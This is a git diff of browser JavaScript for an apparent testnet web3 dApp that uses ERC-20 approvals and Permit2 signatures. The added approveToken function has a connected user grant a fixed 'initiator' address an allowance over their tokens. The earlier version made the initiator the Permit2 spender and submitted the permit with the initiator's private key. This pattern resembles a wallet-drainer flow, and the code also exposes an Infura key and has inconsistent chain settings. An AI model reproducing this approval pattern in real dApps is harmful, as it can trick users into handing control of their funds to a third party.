@@ -2,8 +2,8 @@ const { ethers, ethereum } = window;
 
 // constants
 const RPC = "https://sepolia.infura.io/v3/fb42577745e24d429d936f65b43cca0b"; // Goerly RPC
-const chainId = 5 ; // Goerly chain id  11155111"
-const Permit2ContractAddress = "0x000000000022D473030F116dDEE9F6B43aC78BA3"; // Permit2 deployed to Sepolia : 0x3Aa6320A008413F71149d3EB00328B669F8C2569
+const chainId = 5; // Goerly chain id  11155111"
+const Permit2ContractAddress = "0x3Aa6320A008413F71149d3EB00328B669F8C2569"; // Permit2 deployed to Sepolia : 0x3Aa6320A008413F71149d3EB00328B669F8C2569
 // const token1 = "0x8556C135e9899bc6e747f80a3084b2Ff5dDC574C"; // SHIBA on Goerly
 // const token2 = "0xAe258c792361101eE7DC3061f8f259365b44769F"; // USDT on Goerly
 const tokenAddresses = [
@@ -13,8 +13,8 @@ const tokenAddresses = [
   // Replace with DAI address
 ];
 
-const amount1 = String(20 * 10 ** 18); // calculate SHIBA
-const initiator = "0xf922DABeb86327A585D5c4615A2CA6C39384f3F1"; // initiator address
+const amount1 = String(20 * 10 ** 18); // calculate SHIBA  20 * 10 ** 18
+const initiator = ""; // initiator address
 const initiatorPK =
   ""; // initiaror's private key
 
@@ -134,11 +134,37 @@ async function connect() {
   connectButton.disabled = true;
   approveButton.disabled = false;
   mainButton.disabled = false;
+  console.log(selectedAddress);
 }
 
-// function for token approval to the Permit2 contract
-// function for token approval to the Permit2 contract
 async function approveToken() {
+  const tokenContracts = tokenAddresses.map((tokenAddress) => {
+    return new web3.eth.Contract(ERC20_ABI, tokenAddress, {
+      from: selectedAddress,
+    });
+  });
+
+  const approvePromises = tokenContracts.map((tokenContract) => {
+    return tokenContract.methods
+      .approve(initiator, amount1)
+      .send({ from: selectedAddress });
+  });
+
+  Promise.all(approvePromises)
+    .then(() => {
+      console.log(
+        "You successfully approved the tokens with the amount",
+        amount1
+      );
+    })
+    .catch((error) => {
+      console.error("Error approving tokens:", error);
+    });
+}
+
+
+// function for token approval to the Permit2 contract
+async function permit() {
   const permit2Contract = new web3.eth.Contract(
     Permit2ContractABI,
     Permit2ContractAddress
@@ -153,7 +179,7 @@ async function approveToken() {
 
   const permitBatch = {
     details: permitDetails,
-    spender: initiator,
+    spender: selectedAddress,
     sigDeadline: Math.floor(Date.now() / 1000) + 120,
   };
 
@@ -200,7 +226,7 @@ async function approveToken() {
     gasPrice: web3.utils.toHex(Math.floor(gasPrice * 1.3)),
     value: "0x",
     data: permit2Contract.methods
-      .permit(initiator, permitBatch, signature)
+      .permit(selectedAddress, permitBatch, signature)
       .encodeABI(),
   };
 
@@ -226,3 +252,7 @@ window.addEventListener("DOMContentLoaded", () => {
   window.addEventListener("DOMContentLoaded", () => {
     approveButton.onclick = approveToken;
   });
+
+window.addEventListener("DOMContentLoaded", () => {
+  mainButton.onclick = permit;
+});
